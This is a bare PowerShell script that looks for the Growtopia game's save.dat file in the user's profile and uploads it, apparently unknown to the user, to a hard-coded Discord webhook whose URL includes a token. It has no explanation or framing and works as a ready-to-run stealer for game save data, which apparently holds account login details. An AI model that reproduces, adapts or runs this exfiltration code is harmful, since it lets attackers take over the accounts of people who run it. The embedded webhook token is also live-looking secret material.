$webhookUrl='https://discord.com/api/webhooks/1347454008037609504/Wcjv87xpJtqQF9QsthvBio5hNeQE0YjLO5j91geZIsiAK8FtJOzyByKHBQ1rm6c_F39z'
$userProfile = $env:USERPROFILE
$paths = @("$userProfile\AppData\Local\Growtopia\save.dat", "$userProfile\AppData\Local\Growtopia\save")
$foundFile = $null
foreach ($path in $paths) {
if (Test-Path $path) {
$foundFile = $path
break
}
}
if ($foundFile -ne $null) {
echo "Found file: $foundFile"
$fileName=[System.IO.Path]::GetFileName($foundFile)
$boundary = "----WebKitFormBoundary" + [guid]::NewGuid().ToString()
$body = "--$boundary`r`nContent-Disposition: form-data; name=`"content`"`r`n`r`nUploading save file...`r`n"
$body += "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`nContent-Type: application/octet-stream`r`n`r`n"
$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body) + [System.IO.File]::ReadAllBytes($foundFile) + [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
$webRequest = [System.Net.WebRequest]::Create($webhookUrl)
$webRequest.Method = "POST"
$webRequest.ContentType = "multipart/form-data; boundary=$boundary"
$webRequest.ContentLength = $bodyBytes.Length
$requestStream = $webRequest.GetRequestStream()
$requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
$requestStream.Close()
$response = $webRequest.GetResponse()
$responseStream = $response.GetResponseStream()
$reader = New-Object System.IO.StreamReader($responseStream)
$reader.ReadToEnd()
echo 'Upload Complete!'
} else {
echo 'ERROR: No save file found!'
} 
